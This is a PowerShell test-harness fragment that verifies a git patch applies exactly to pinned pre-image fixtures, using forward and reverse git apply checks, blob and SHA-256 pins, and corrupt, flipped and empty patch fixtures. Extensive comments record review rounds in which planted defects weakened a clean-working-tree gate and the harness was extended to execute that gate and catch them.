$gateReport = (@($gateVerdicts | ForEach-Object {
    $miss = if ($_.Missing.Count -gt 0) { '  MISSING: ' + ($_.Missing -join '  ') } else { '' }
    $pres = if ($_.Present.Count -gt 0) { '  FORBIDDEN PRESENT: ' + ($_.Present -join '  ') } else { '' }
    "    [$($_.Gate)]  $($_.File)" + "`r`n" +
    "      mechanism carried : $($_.Mechanism)" + "`r`n" +
    "      $($_.ReqCount) required / $($_.ForbCount) forbidden CODE substring(s), tested against THIS hunk only : $($_.Ok)$miss$pres"
}) -join "`r`n")

$workTreeDeclared = $wtReader -and $wtJudges -and $wtFailsClosed -and $readerReal -and
                    $wtSingleSource -and $wtClosedTests -and $stripWorks -and $noBlockComment
$mechanismOk      = $workTreeDeclared -and $gateScopingOk -and $hunksDistinct

# V-1 ROUND 1. A patch that READS correct and does not APPLY is not a patch. The
# hand-maintained version passed every text assertion above while `git apply --check` rejected it
# with "corrupt patch": both hunk headers understated their new-side line count by 2, because
# an earlier revision added lines and the @@ counts were not updated. The operator applies this file to
# <project> at install time, so a text-only check was testing the wrong property of the wrong
# artifact. It was then regenerated mechanically and measured against real copies of tools/ -- the
# live-tree measurement a later revision replaced (see the block at the head of this member).
#
# That measurement was ONE-DIRECTIONAL -- forward `git apply
# --check` only -- and it went red without the artifact changing. DRIVEN: the patch parses, every
# text conjunct above is True, and `git diff` over tools/evidence-hooks-next/ since the register's
# baseline is EMPTY. The forward check fails because THIS repo's tools/mission-lib.ps1 and
# tools/mission-spec-accept.ps1 ALREADY CARRY the D9 exemption -- installed by a commit which is
# an ancestor of the register's baseline -- so the copies taken below are copies of the POST-image
# and the patch's pre-image context cannot match. Measured against those copies: forward exit 1,
# REVERSE exit 0. The patch's declared pre-image is <project>-as-shipped-WITHOUT-D9, which is what
# the operator applies at the Part 6 swap, so the ARTIFACT is correct for its stated target and the
# INSTRUMENT'S ASSUMPTION was stale. Regenerating the patch against CURRENT SOURCE is not a cure in
# kind: that diff would be EMPTY, which fails $namesBoth, $namesPat, $addsLines and every per-gate
# mechanism conjunct below, and leaves the smoke repo without the text WP-6 S-5 reads. Regeneration
# in the sense actually used by the first replacement is the other thing: the PRE-image side is
# pinned to the exemption-free base (`git diff <base> HEAD -- <the two files>`) and only the
# POST-image side moves onto the cured gate, which is why this patch still has a body at all.
#
# So what was measured from then until a later revision was EXACTNESS IN EITHER DIRECTION
# against the same copies: git had to PARSE the patch and match ONE SIDE of it EXACTLY. It was not a
# relaxation then -- a patch whose body had drifted from tools/ matched NEITHER side, a malformed one
# was rejected at parse time before either side was consulted, and an empty one matched BOTH (refused
# as a no-op by H-3b). It was also not a text check: the 736-741 defect stayed refused. The leg that
# carried the pass was printed, so a silent flip between them was visible in the evidence.
#
# WHAT IS MEASURED NOW. The same two git calls, against a tree built from the
# pinned PRE-IMAGE FIXTURE, in ONE FIXED DIRECTION: forward must succeed AND reverse must fail. The
# fixture IS the pre-image by construction -- $preImagePinned binds it to the face and to the body's
# own index lines -- so there is no second legitimate state to admit, and admitting one would reopen
# the door that correction only had to open because the subject was the live tree. A body that has drifted
# from its pre-image fails forward; a patch whose sides are swapped fails forward and reverse-applies;
# a malformed one is rejected at parse time; an empty one is refused at parse time by this git and,
# when git is told to accept it (--allow-empty), applies in BOTH directions and fails the reverse leg.
# H-3b drives all of those. Both exit codes and a state are still printed, so a red names its leg.
function Measure-PatchExactness {
    param([string]$PatchFile, [string]$TreeDir, [switch]$AllowEmpty)
    $fwd = 1
    $rev = 1
    $prevEap = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try {
        Push-Location $TreeDir
        try {
            & git init -q . 2>&1 | Out-Null
            if ($AllowEmpty) {
                & git apply --check --allow-empty    $PatchFile 2>&1 | Out-Null
                $fwd = $LASTEXITCODE
                & git apply --check --allow-empty -R $PatchFile 2>&1 | Out-Null
                $rev = $LASTEXITCODE
            } else {
                & git apply --check    $PatchFile 2>&1 | Out-Null
                $fwd = $LASTEXITCODE
                & git apply --check -R $PatchFile 2>&1 | Out-Null
                $rev = $LASTEXITCODE
            }
        } finally { Pop-Location }
    } finally { $ErrorActionPreference = $prevEap }
    $state = if (($fwd -eq 0) -and ($rev -ne 0))     { 'PRE-IMAGE -- applies FORWARD exactly and does not reverse-apply' }
             elseif (($fwd -ne 0) -and ($rev -eq 0)) { 'POST-IMAGE -- reverse-applies exactly and does not apply forward' }
             elseif (($fwd -eq 0) -and ($rev -eq 0)) { 'BOTH -- applies in BOTH directions, which is what an empty or no-op patch does' }
             else { 'NEITHER -- the patch does not correspond to this tree in either direction' }
    [pscustomobject]@{ Forward = $fwd; Reverse = $rev; Ok = (($fwd -eq 0) -and ($rev -ne 0)); State = $state }
}
function Invoke-PatchTransform {
    param([string]$PatchFile, [string]$TreeDir, [bool]$Reverse)
    $exit = 1
    $prevEap = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try {
        Push-Location $TreeDir
        try {
            & git init -q . 2>&1 | Out-Null
            if ($Reverse) { & git apply -R $PatchFile 2>&1 | Out-Null } else { & git apply $PatchFile 2>&1 | Out-Null }
            $exit = $LASTEXITCODE
        } finally { Pop-Location }
    } finally { $ErrorActionPreference = $prevEap }
    $exit
}
$applyDir = Join-Path $repoRoot '.mission-runtime\lam-wp1-patchcheck'
if (Test-Path -LiteralPath $applyDir) { Remove-Item -LiteralPath $applyDir -Recurse -Force }

# --- THE PRE-IMAGE FIXTURE AND ITS PIN ON THE PATCH FACE ------------------------------------------
# Which body file each fixture stands for, and the F-0 row that locates it. F-0 has already asserted
# both fixtures are present; this table is the ONE place the patch-path -> fixture mapping lives.
$preImageRows = @(
    [pscustomobject]@{ PatchPath = 'tools/mission-lib.ps1'
                       F0Key     = 'patches/clean-tree-exemption-pre-image/mission-lib.ps1.preimage' }
    [pscustomobject]@{ PatchPath = 'tools/mission-spec-accept.ps1'
                       F0Key     = 'patches/clean-tree-exemption-pre-image/mission-spec-accept.ps1.preimage' }
)
function New-PreImageTree {
    # A scratch tree holding the patch's recorded PRE-IMAGE under the paths the patch names, copied
    # byte-for-byte from the pinned fixtures -- NEVER from the live tools/. The
    # fixtures follow the same EOL conversion as the patch beside them (no -text attribute), so a
    # CRLF checkout pairs a CRLF patch with CRLF files and an LF checkout pairs LF with LF.
    param([string]$Dir)
    foreach ($pr in $preImageRows) {
        $dest = Join-Path $Dir ($pr.PatchPath -replace '/', '\')
        New-Item -ItemType Directory -Path (Split-Path -Parent $dest) -Force | Out-Null
        Copy-Item -LiteralPath $required[$pr.F0Key] -Destination $dest -Force
    }
    $Dir
}
function Get-Wp1LfBytes {
    # THE LF BASIS: every CRLF pair collapsed to LF, in-process, no git and no shell -- the basis H-15
    # and WP-5 K-4 measure, and the content git hashes into a blob under core.autocrlf.
    # `return , $x` survives ASSIGNMENT; never wrap a call of this in @() (it double-wraps).
    param([string]$Path)
    $raw = [System.IO.File]::ReadAllBytes($Path)
    $ms  = New-Object System.IO.MemoryStream
    for ($i = 0; $i -lt $raw.Length; $i++) {
        if ($raw[$i] -eq 13 -and ($i + 1) -lt $raw.Length -and $raw[$i + 1] -eq 10) { continue }
        $ms.WriteByte($raw[$i])
    }
    return , $ms.ToArray()
}
function Get-Wp1GitBlobId {
    # git's object id for a blob, computed in-process: SHA-1 over "blob <byte count>", a NUL, then the
    # bytes. (Checked against git's own empty-blob id e69de29b while this was written.)
    param([byte[]]$Bytes)
    $hdr = [System.Text.Encoding]::ASCII.GetBytes('blob ' + $Bytes.Length)
    $all = New-Object byte[] ($hdr.Length + 1 + $Bytes.Length)
    [Array]::Copy($hdr, 0, $all, 0, $hdr.Length)
    $all[$hdr.Length] = 0
    [Array]::Copy($Bytes, 0, $all, $hdr.Length + 1, $Bytes.Length)
    ([BitConverter]::ToString(([System.Security.Cryptography.SHA1]::Create()).ComputeHash($all)) -replace '-', '').ToLowerInvariant()
}
function Get-Wp1Sha256 {
    param([byte[]]$Bytes)
    ([BitConverter]::ToString(([System.Security.Cryptography.SHA256]::Create()).ComputeHash($Bytes)) -replace '-', '').ToLowerInvariant()
}

# THE PATCH, SPLIT INTO ITS FACE AND ITS BODY. The face is everything before the first diff header.
# Each body section is keyed by the path on its OWN diff header line and carries the two ids on its
# `index` line: pre-image id .. post-image id.
$pinFirstDiff  = [regex]::Match($patchText, '(?m)^diff --git ')
$patchPreamble = if ($pinFirstDiff.Success) { $patchText.Substring(0, $pinFirstDiff.Index) } else { $patchText }
$bodySections  = @()
$pinSplit      = @($patchText -split '(?m)^diff --git ')
for ($pinS = 1; $pinS -lt $pinSplit.Count; $pinS++) {
    $pinSecLines = @($pinSplit[$pinS] -split "`r?`n")
    $pinHead     = [regex]::Match($pinSecLines[0], '^a/(\S+) b/(\S+)$')
    $pinPre      = ''
    $pinPost     = ''
    foreach ($pinLn in $pinSecLines) {
        if ($pinLn -like '@@*') { break }
        $pinIdx = [regex]::Match($pinLn, '^index ([0-9a-f]{7,40})\.\.([0-9a-f]{7,40})(?: [0-7]{6})?$')
        if ($pinIdx.Success) { $pinPre = $pinIdx.Groups[1].Value; $pinPost = $pinIdx.Groups[2].Value; break }
    }
    $pinPath = if ($pinHead.Success -and ($pinHead.Groups[1].Value -ceq $pinHead.Groups[2].Value)) { $pinHead.Groups[1].Value }
               else { '<unparsed diff header: ' + $pinSecLines[0] + '>' }
    $bodySections += [pscustomobject]@{ Path = $pinPath; Pre = $pinPre; Post = $pinPost }
}
# THE PIN BLOCKS ON THE FACE. Parsed STRICTLY -- five lines, fixed labels, full-length ids -- and
# every line that begins a PIN block is counted separately, so a block that stops parsing is a red
# count mismatch rather than a block silently skipped.
$pinRe     = '(?m)^  PIN (\S+)\r?\n    fixture    (\S+)\r?\n    blob       ([0-9a-f]{40})\r?\n    lf-bytes   ([0-9]+)\r?\n    lf-sha256  ([0-9a-f]{64})\r?$'
$pinBlocks = @([regex]::Matches($patchPreamble, $pinRe) | ForEach-Object {
    [pscustomobject]@{ Path = $_.Groups[1].Value; Fixture = $_.Groups[2].Value; Blob = $_.Groups[3].Value
                       Bytes = [long]$_.Groups[4].Value; Sha = $_.Groups[5].Value } })
$pinHeads  = @([regex]::Matches($patchPreamble, '(?m)^[ \t]*PIN\b')).Count
$pinVerdicts = @()
foreach ($pr in $preImageRows) {
    $pinSec   = @($bodySections | Where-Object { $_.Path -ceq $pr.PatchPath })
    $pinFor   = @($pinBlocks    | Where-Object { $_.Path -ceq $pr.PatchPath })
    $pinFix   = $required[$pr.F0Key]
    $pinOne   = ($pinFor.Count -eq 1)
    $pinSecOk = ($pinSec.Count -eq 1)
    $pinFaceFixture = $pinOne -and ($pinFor[0].Fixture -ceq ('tools/evidence-hooks-next/' + $pr.F0Key))
    $pinHere  = Test-Path -LiteralPath $pinFix
    $pinBytes = $null
    if ($pinHere) { $pinBytes = Get-Wp1LfBytes -Path $pinFix }
    $pinMBytes = -1
    $pinMSha   = ''
    $pinMBlob  = ''
    if ($null -ne $pinBytes) {
        $pinMBytes = $pinBytes.Length
        $pinMSha   = Get-Wp1Sha256 -Bytes $pinBytes
        $pinMBlob  = Get-Wp1GitBlobId -Bytes $pinBytes
    }
    $pinBytesOk = $pinOne -and ($pinMBytes -eq $pinFor[0].Bytes)
    $pinShaOk   = $pinOne -and ($pinMSha -ceq $pinFor[0].Sha)
    $pinBlobOk  = $pinOne -and ($pinMBlob -ceq $pinFor[0].Blob)
    $pinIndexOk = $pinSecOk -and ($pinSec[0].Pre.Length -ge 7) -and $pinMBlob.StartsWith($pinSec[0].Pre, [System.StringComparison]::Ordinal)
    $pinVerdicts += [pscustomobject]@{
        PatchPath   = $pr.PatchPath
        FixtureRel  = 'tools/evidence-hooks-next/' + $pr.F0Key
        Present     = $pinHere
        PinOne      = $pinOne
        SectionOne  = $pinSecOk
        FaceFixture = $pinFaceFixture
        FaceBytes   = $(if ($pinOne) { $pinFor[0].Bytes } else { '<no pin>' })
        FaceSha     = $(if ($pinOne) { $pinFor[0].Sha } else { '<no pin>' })
        FaceBlob    = $(if ($pinOne) { $pinFor[0].Blob } else { '<no pin>' })
        IndexPre    = $(if ($pinSecOk) { $pinSec[0].Pre } else { '<no section>' })
        MBytes      = $pinMBytes
        MSha        = $pinMSha
        MBlob       = $pinMBlob
        BytesOk     = $pinBytesOk
        ShaOk       = $pinShaOk
        BlobOk      = $pinBlobOk
        IndexOk     = $pinIndexOk
        Ok          = ($pinOne -and $pinSecOk -and $pinFaceFixture -and $pinHere -and $pinBytesOk -and $pinShaOk -and $pinBlobOk -and $pinIndexOk)
    }
}
$pinSetsAgree   = ($pinBlocks.Count -eq $pinHeads) -and ($pinBlocks.Count -eq $preImageRows.Count) -and
                  ($bodySections.Count -eq $preImageRows.Count)
$preImagePinned = $pinSetsAgree -and ($pinVerdicts.Count -eq $preImageRows.Count) -and
                  (@($pinVerdicts | Where-Object { -not $_.Ok }).Count -eq 0)
$pinReport = (@($pinVerdicts | ForEach-Object {
    "    [$($_.PatchPath)]  fixture $($_.FixtureRel)" + "`r`n" +
    "      exactly one PIN block : $($_.PinOne)   exactly one body section : $($_.SectionOne)   the face names F-0's fixture path : $($_.FaceFixture)   fixture present : $($_.Present)" + "`r`n" +
    "      LF bytes  : face $($_.FaceBytes)   measured $($_.MBytes)   : $($_.BytesOk)" + "`r`n" +
    "      LF sha256 : face $($_.FaceSha)" + "`r`n" +
    "                  measured $($_.MSha)   : $($_.ShaOk)" + "`r`n" +
    "      git blob  : face $($_.FaceBlob)   computed in-process $($_.MBlob)   : $($_.BlobOk)" + "`r`n" +
    "      the computed blob id begins with the PRE-image id on this file's own index line ($($_.IndexPre)) : $($_.IndexOk)"
}) -join "`r`n")

$preImageDir    = New-PreImageTree (Join-Path $applyDir 'preimage')
$exact          = Measure-PatchExactness -PatchFile $patchPath -TreeDir $preImageDir
$applyFwd       = $exact.Forward
$applyRev       = $exact.Reverse
$applyState     = $exact.State
$appliesForward = $exact.Ok

# H-3b FIXTURES, built here because they share the fixture trees and the sandbox with the measurement.
# Since the pre-image was pinned, every one of them is a tree built from the pinned PRE-IMAGE FIXTURE.
# (a) REFUSE. The V-1 round 1 defect itself: @@ new-side counts understated by 2. Built by
#     rewriting the REAL patch's hunk headers, so the fixture tracks the artifact rather than
#     being a frozen copy of it that could drift into testing nothing. git rejects it at PARSE
#     time, before either side is consulted -- DRIVEN 128 forward and 128 reverse.
# (b) THE OTHER LEG. The pre-image tree exercises forward-yes / reverse-no; a second tree, the SAME
#     fixture plus ONE forward apply, exercises reverse-yes / forward-no, so both git directions are
#     seen both succeeding and failing. HISTORY, kept because the correction matters: before the pre-image was pinned
#     this tree was a ROUND TRIP over copies of the live tools/ that "followed tools/ in either
#     direction", and the only thing making it more than a tautology was an OUT-OF-BAND reading --
#     the reverse apply reproduced the exemption-free tools/, a sha256 per file (mission-lib.ps1
#     and mission-spec-accept.ps1), measured earlier and re-measured once more
#     but NOT by this instrument. Those two digests became the PINS on the patch
#     face (since re-derived for the edits the face discloses), re-measured by $preImagePinned on every run.
# (c) EMPTY. A zero-byte patch -- what a naive "refresh this file against current source" produces.
#     Measured twice: as git reads it by default (this git refuses empty input at parse time), and
#     with --allow-empty, where git ACCEPTS it and it applies in BOTH directions -- which is the case
#     the FIXED direction exists to refuse, driven rather than argued.
$corruptPatch = Join-Path $applyDir 'corrupt-hunk-counts.patch'
$corruptText  = [System.Text.RegularExpressions.Regex]::Replace(
    $patchText, '(?m)^@@ -(\d+),(\d+) \+(\d+),(\d+) @@',
    { param($m) '@@ -' + $m.Groups[1].Value + ',' + $m.Groups[2].Value + ' +' + $m.Groups[3].Value + ',' + ([int]$m.Groups[4].Value - 2) + ' @@' })
[System.IO.File]::WriteAllText($corruptPatch, $corruptText)
$corruptBuilt = ($corruptText -ne $patchText)
$corruptRes   = Measure-PatchExactness -PatchFile $corruptPatch -TreeDir (New-PreImageTree (Join-Path $applyDir 'corrupt'))

$flipDir  = New-PreImageTree (Join-Path $applyDir 'flipped')
$flipExit = Invoke-PatchTransform -PatchFile $patchPath -TreeDir $flipDir -Reverse $false
$flip     = Measure-PatchExactness -PatchFile $patchPath -TreeDir $flipDir

$emptyPatch    = Join-Path $applyDir 'empty.patch'
[System.IO.File]::WriteAllBytes($emptyPatch, [byte[]]@())
$emptyBuilt    = (Test-Path -LiteralPath $emptyPatch) -and ((Get-Item -LiteralPath $emptyPatch).Length -eq 0)
$emptyDir      = New-PreImageTree (Join-Path $applyDir 'empty')
$emptyRes      = Measure-PatchExactness -PatchFile $emptyPatch -TreeDir $emptyDir
$emptyAllowRes = Measure-PatchExactness -PatchFile $emptyPatch -TreeDir $emptyDir -AllowEmpty


# =============================================================================================
# ROUND 4 -- WHAT BINDS THE MECHANISM IS AN EXECUTION. EVERYTHING ABOVE IS THE NET.
# =============================================================================================
# WHY THERE IS A ROUND 4. The work-tree half has now been written three ways and refuted twice by
# two independent validators, every time DRIVEN rather than argued:
#   ROUND 1 -- four collapsed-form prefix literals. Encoded the very defect the work-tree cure
#     removed. Refuted above.
#   ROUND 2 -- a negative spelling blacklist plus three positive Contains() conjuncts. Refuted
#     above: the blacklist banned the gate's OLD path-only idiom while the cured gate matches the
#     WHOLE porcelain line, and the positive conjuncts ran over text that is majority COMMENT.
#   ROUND 3 -- the code-only stripping, the per-gate table and the two "closed lists" that stand
#     immediately above. REFUTED AGAIN, three ways. All three were RE-DRIVEN at the head of this
#     round before one line was changed, planting in BOTH tools/mission-lib.ps1 and the patch's
#     post-image so exactly-one-direction stayed satisfied:
#       * A SECOND, INDEPENDENT, CODE-RESIDENT JUDGMENT, written with an operator the test-site
#           enumeration does not list --
#             if ([regex]::IsMatch($line, '^\?\? ' + [string][char]46 + 'mission/')) { $tolerated++; continue }
#           hunk header bumped +94,174 -> +94,175. It reinstates the ENTIRE untracked .mission/
#           plane as a constant no mission can narrow. MEASURED: WP-1 all 22 checks passed, exit 0.
#       * A NON-EMPTY $AllowPaths DEFAULT on the param line -- which is a CONTEXT line, and
#           neither closed list selects a param line at all. MEASURED: all 22 passed, exit 0.
#       * AN INERT JUDGMENT -- foreach ($raw in $lines) { becomes foreach ($raw in @()) { . The
#           enumerated judgment line stays byte-identical and is still "found", and never runs.
#           MEASURED: all 22 passed, exit 0.
#   THE ROOT CAUSE, accepted rather than patched around: the two closed lists are NOT closed,
#   because line SELECTION is a regex BLACKLIST over spellings and only the SELECTED lines are
#   then whitelisted. Round 3 swapped a blacklist over PATH spellings for a blacklist over
#   OPERATOR spellings and stayed inside the same "measuring the spelling, not the property"
#   class. A text assertion over a patch's post-image cannot bind a BEHAVIOURAL property of the
#   code in that post-image. Three rounds is enough evidence of that, so this round stops trying.
#
# WHICH CONJUNCT BINDS AND WHICH IS THE NET -- stated here and repeated in the member's title and
# detail block, because a reader who cannot tell them apart will maintain the wrong one:
#   BINDS : $execBinds. The gate the PATCH PRODUCES is EXECUTED against every isolated scratch
#           mission roots and its BEHAVIOUR is asserted in both directions. A defect reaches this
#           leg through what the code DOES, so its spelling is irrelevant and no enumeration of
#           spellings is involved anywhere in it.
#   NET   : every conjunct above -- the per-gate expectation table, SINGLE SOURCE, CLOSED TEST
#           SURFACE, the stripper control. They are cheap, they catch ARTIFACT DRIFT early and
#           name the drifted line, and the per-gate table genuinely fixed the
#           one-gate's-requirement-reads-as-the-other's-permission contradiction (a validator
#           confirmed that by driving both sides). They are kept. WHAT THEY BIND, stated exactly
#           rather than dismissed: a BLACKLIST OVER SPELLINGS -- every spelling their enumerations
#           name is refused, and one they do not name is invisible. A real bound, and not the
#           mechanism.
#
# (a) THE TREE UNDER EXECUTION IS DERIVED FROM THE PATCH BODY, NOT READ FROM THE REPOSITORY.
#     Since an earlier revision the PRE-image is the pinned FIXTURE, no longer a reverse apply against
#     copies of the live tools/; applying the patch FORWARD to it yields a post-image that came OUT
#     OF THE PATCH BODY. That is H-3b's flipped-tree construction and Invoke-PatchTransform, REUSED
#     rather than reinvented. THE POINT: a defect planted in the patch is CARRIED INTO THE PROCESS
#     THIS MEMBER STARTS. A defect planted in tools/ alone no longer reaches this member AT ALL --
#     that is the decoupling -- and it is H-16 that judges it. (Before that revision such a plant matched
#     NEITHER direction against the live copies, so the exactness conjunct went red before this leg
#     was reached.)
# (b) THE ADMISSION READER IS COPIED IN BESIDE IT. Assert-CleanWorkingTree resolves its reader as
#     $PSScriptRoot\lam\lam-verify-admission.ps1; without it the gate refuses for want of its own
#     rule, which would look like every REFUSE case passing for the wrong reason. $readerReal
#     above asserts separately that this library is the real one.
# (c) EVERY FIXTURE'S PORCELAIN SHAPE IS ASSERTED BEFORE ITS VERDICT IS TRUSTED (instrument
#     -integrity law F-0). A fixture that emitted no porcelain would make ADMITTED trivially true
#     and every REFUSE row false-red; the expected line is written out per row and compared.
#     git collapses a WHOLLY-untracked directory to its shallowest path, so the rows that need a
#     per-file line get a TRACKED anchor in both planes and the rows that need the COLLAPSED line
#     deliberately get none -- both shapes are real and both are judged.
# (d) ROUND 5: THE LEG IS SOUND AND ITS ROW SET WAS NOT. A fresh-context validator confirmed the
#     execution leg is REAL AND LOAD-BEARING -- all three round-3 refutations dead, the tree under
#     execution genuinely DERIVED FROM THE PATCH (proved by making the patch and tools/ differ and
#     watching which verdict followed), fail-closed when its own apparatus breaks, zero repository
#     residue -- and then refuted it on ORDINARY TEST COVERAGE. Two NAMED PROPERTIES OF THE CURE
#     had no row, and each was DRIVEN straight through all ten rows, planted in BOTH
#     tools/mission-lib.ps1 and the patch post-image with the hunk header bumped +94,174 ->
#     +94,175, each leaving "WP-1: all 22 checks passed", EXIT 0, H-3 [PASS], the binding conjunct
#     True and all ten rows green. RE-DRIVEN HERE at the head of this round before a line was
#     changed, and both reproduced exactly:
#       ESCAPE -- DELETED-STATUS TOLERANCE, at the judgment site:
#         if ([regex]::IsMatch($line, '^' + [string][char]32 + 'D ')) { $tolerated++; continue }
#       It admits EVERY worktree-deleted tracked file, a deleted report under the DECLARED verify-
#       prefix included. Row a4 closed the MODIFIED status; NOTHING closed DELETED.
#       ESCAPE -- ABSENT-DECLARATION FAIL-OPEN, same site:
#         if (-not $decl.declared) { $tolerated++; continue }
#       It admits everything when the mission declares no admitted_porcelain at all, contradicting
#       the cure block's own capitalised law that with NO declaration the gate ADMITS NOTHING and
#       that there must be no code default.
#     Both also evade the SECONDARY NET: $testSiteRe was run directly against both plant lines and
#     returned False, because `[regex]::IsMatch(` and `-not` are absent from its enumerated
#     alternation. That is the net's DISCLOSED blacklist bound doing exactly what it is disclosed
#     to do, not a new finding. SAID PRECISELY -- because the round-5 report said the stronger and
#     FALSE thing, "the net binds nothing", and that wording is corrected here as round 6's finding
#     -- the net DOES bind, as a BLACKLIST OVER SPELLINGS. It refuses every spelling its two
#     enumerations name; a spelling they do not name walks past it. What it cannot do is bind a
#     BEHAVIOURAL property, which is the whole reason the execution leg exists.
#     THE FIX IS NOT ANOTHER ROW SOMEONE THOUGHT OF. The row set is now READ OFF THE CURE BLOCK'S
#     OWN CLAIMS and the mapping is a CHECKED conjunct ($claimsCovered); the member goes red if a
#     claim has no row. 10 rows became 30. ROUND 6 CORRECTION, kept here because the sentence that
#     stood in its place is the one the validator refuted: what round 5 added was SEVEN statuses
#     against a declared prefix ( D , D  , A  , AM, R  old -> new, MM, UU) while CLAIMING "every
#     non-untracked status", which is an overclaim of nine shapes over thirty-four. The seven are
#     unchanged and still here; the universal is now driven by the DERIVED sweep instead. Also the
#     UNREADABLE declaration, the absent reader library, the session- prefix in both directions, a
#     two-entry declaration admitting on its SECOND entry and refusing a near miss in its first
#     entry's plane, the clean-tree early return, -AllowPaths refusing a second stray, and a
#     git-QUOTED path with a space.
# (e) WHAT THIS LEG STILL DOES NOT REACH, stated PRECISELY because the vague form of this
#     paragraph was itself an objection -- it offered three examples, and two of them were named
#     properties of the cure that simply had no row (they are rows r1/s5 and q1 now). Nothing
#     listed here is closed anywhere in this member:
#       - THE PATCH'S SPEC-ACCEPT GATE IS NEVER EXECUTED BY THIS MEMBER. The post-image of
#         Assert-CleanGitTree in this patch was not cured with the work-tree gate and is covered by the TEXT
#         table above and by nothing else here. Registered residual.
#         Since an earlier revision the LIVE tools/mission-spec-accept.ps1 gate IS executed --
#         by H-16, which classifies it as cured or open -- but this patch's post-image of it
#         still is not.
#       - THE COPY AND TYPE-CHANGE FAMILIES ARE NOT DRIVEN, and the UNSTAGED RENAME is not either.
#         Round 6 moved these from prose into the ALPHABET PARTITION register below, where each is
#         listed BY CODE with the measurement that shows this host cannot produce it. They are
#         registered UNREACHABLE and explicitly NOT CLAIMED; the status claim in the table is
#         scoped to the driven half and prints the scope.
#       - IGNORED (`!! `) AND SUBMODULE PORCELAIN ARE NOT DRIVEN. The gate reads
#         `git status --porcelain=v1` with no --ignored and no submodule fixture, so neither shape
#         ever reaches a row. `!!` is therefore excluded from the derived alphabet on purpose and
#         the exclusion is stated where the alphabet is built.
#       - THE DECLARATION PARSER IS NOT SWEPT. Five shapes are supplied (block form with one
#         entry, block form with two, the session- prefix, absent, and key-present-but-empty) plus
#         one malformed. The INLINE `[a, b]` form, comment handling and indentation edges are
#         tools/lam/lam-verify-admission.ps1's own business and belong to batch 3's suite.
#       - NOTHING IS DRIVEN AT SCALE. Every row supplies at most two porcelain lines and at most
#         two declared entries, so a defect that only misbehaves above some count is invisible
#         here.
#       - EVERY FIXTURE IS A PLAIN REPOSITORY AT AN ASCII PATH. A bare repo, a linked worktree, a
#         submodule root, a non-ASCII or long path, and a mission root that is not the git root
#         are all inputs no row supplies.
#
# (f) ROUND 6: THE LEG WAS SOUND, THE ROW SET WAS A BLACKLIST AGAIN, AND TWO CLAIMS WERE WIDER
#     THAN THEIR ROWS. A fresh-context validator confirmed everything in (d) that matters -- the
#     leg genuinely executes the patch-derived gate, it is fail-closed when patch and tools/
#     diverge, the two round-5 escapes are red and each names its own row, the artifact is 22/22,
#     the repository is byte-clean -- and then refuted the member on FOUR counts. All four were
#     RE-DRIVEN at the head of this round before a line was changed:
#       REFUTATION -- 'M ' ESCAPED, AND SO WOULD ELEVEN OTHER XY COMBINATIONS. Paragraph (d) said
#         "every non-untracked status against a declared prefix" and then listed seven. One line,
#         planted in BOTH tools/mission-lib.ps1 and the patch post-image (hunk header +94,174 ->
#         +94,175):
#             if ([regex]::IsMatch($line, '^M ')) { $tolerated++; continue }
#         admits `M  notes.txt` -- a TRACKED, UNDECLARED file modified AND STAGED, the commonest
#         form of uncommitted drift A-126 exists to refuse. REPRODUCED EXACTLY: the gate printed
#         "admitted by the mission's declared set" and exited 0, while WP-1 reported all 22 checks
#         passed, EXIT 0, the binding conjunct True, all 30 rows and all 16 claims green, and the
#         net blind (found 4 write site(s), found 6 test site(s), unchanged).
#         CLOSED BY DERIVING THE ALPHABET rather than extending the list -- see the ROUND 6 block
#         at the sweep below. 'M ' is row w04 and is red under that plant; so are 17 other
#         recipes covering 20 of the 34 codes, with the remaining 14 registered UNREACHABLE and
#         NOT CLAIMED.
#       REFUTATION -- THE EARLY-RETURN CLAIM COULD NOT TELL THE DIFFERENCE. Mapped to t1 alone, which is
#         built WITH a valid declaration. Rows t2 (MALFORMED declaration) and t3 (NO declaration)
#         now discriminate, and the claim is reworded to what the code does.
#       REFUTATION -- TWO EMPIRICAL BANNER MEASUREMENTS WERE ASSERTED AND CHECKED NOWHERE. The 166
#         porcelain lines and the ZERO session- lines are measurements of a MOMENT. They are now
#         registered in the claim table as DELIBERATELY NOT CHECKED, with the reason; a claim so
#         registered is red if it ever names a row.
#       REFUTATION -- THE REPORT CALLED THE SECONDARY NET "binds nothing". It binds, as a blacklist over
#         spellings. Corrected in the narrative above and in the printed detail.
#     TWO FURTHER DEFECTS OF THE SAME CLASS, INVENTED AND DRIVEN AFTER THE CURE, each planted in
#     BOTH files with the hunk header bumped, each restored byte-exactly afterwards:
#       FURTHER 1 -- THE WHOLE UNMERGED FAMILY EXCEPT THE ONE ROW 5 HAPPENED TO DRIVE:
#             if ($line -match '^(DD|AU|UA|DU|UD|AA) ') { $tolerated++; continue }
#         Round 5's set contained UU and nothing else unmerged, so it would have passed it whole.
#         CAUGHT: rows w15, w16, w17 and w18 red, binding conjunct False, WP-1 EXIT 1. Reported
#         honestly: the SECONDARY NET also caught this one (found 7 test site(s)), because the
#         plant is spelled with `-match`, which its enumeration happens to name.
#       FURTHER 2 -- INTENT-TO-ADD PLUS THE THREE "STAGED THEN GONE FROM THE WORK TREE" SHAPES,
#         written in an idiom the net cannot see:
#             if ([regex]::IsMatch($line, '^( A|AD|MD|RD) ')) { $tolerated++; continue }
#         CAUGHT BY THE EXECUTION LEG ALONE: rows w03, w06, w09 and w13 red, WP-1 EXIT 1, while the
#         net stayed BLIND exactly as disclosed -- found 4 write site(s), found 6 test site(s),
#         both unchanged. That is the leg, not the net, being the binding conjunct, measured.
#     WHAT THE SWEEP STILL DOES NOT REACH, said rather than left to be found: a tolerance keyed on
#     a code in the UNREACHABLE half of the partition -- `^CT`, `^C `, `^ R` and the eleven others
#     -- is invisible here, because no fixture on this host can produce the line that would trip
#     it. Those codes are listed with their measurement and are NOT claimed; a host that can make
#     symlinks, or a git that scores copies, would need rows for them before the claim could widen.
#
# READ, NOT REUSED, AND SAID SO: tools/tests/cli/test_a126_admitted_porcelain.py and
# tools/tests/cli/_drv_clean_working_tree.ps1 measure the same cure from
# pytest with eleven members. That pair belongs to another change's file set. It was read to learn how a scratch
# mission root and a scratch git repository are stood up so that porcelain really emits the
# planted lines; it is neither edited nor invoked from here. WP-1 needs its own leg because H-3's
# subject is the PATCH ARTIFACT, which that suite never reads -- the two are not substitutes.
$a126Drv   = Join-Path $nextRoot 'tests\_drv-a126-clean-tree.ps1'
$a126DrvOk = Test-Path -LiteralPath $a126Drv

